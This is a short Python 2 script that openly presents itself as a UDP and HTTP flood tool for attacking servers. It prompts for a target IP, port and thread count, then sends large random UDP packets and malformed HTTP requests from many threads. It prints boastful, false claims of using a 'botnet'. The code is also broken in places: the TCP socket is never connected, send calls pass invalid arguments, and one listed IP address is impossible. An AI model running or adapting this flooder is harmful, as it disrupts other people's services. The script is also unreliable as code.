import socket
import random
import threading
import os

if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')
print("THE UDP + HTTP METHOD")
ip = raw_input("\033[1;91mIP : ")
port = input("port : ")
thread = input("Thread : ")
bytes1 = random._urandom(65000)
bytes2 = random._urandom(65000)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sent = 5000
fakeip = ['192.188.5.4', '192.167.6.6', '192.154.1.1', '188.1513.1.1', '192.145.1.5']
if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')
print("\033[1;33mAttacking Servers With 5000 Nuke And 65 Bomber In Total ...")
def flood():
    for e in fakeip:
        try:
            s.sendto(bytes1, (ip,port))
            s.sendto(bytes2, (ip,port))
            http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
            http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
            for i in range(thread):
                s.send(bytes1)
                http.send(bytes1)
            print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
        except TypeError:
            print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
        except:
            s.sendto(bytes1, (ip,port))
            s.sendto(bytes2, (ip,port))
            http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
            http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
            for i in range(thread):
                s.send(bytes1)
                http.send(bytes1)
            print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
for i in range(thread):
    thr = threading.Thread(target=flood)
    thr.start()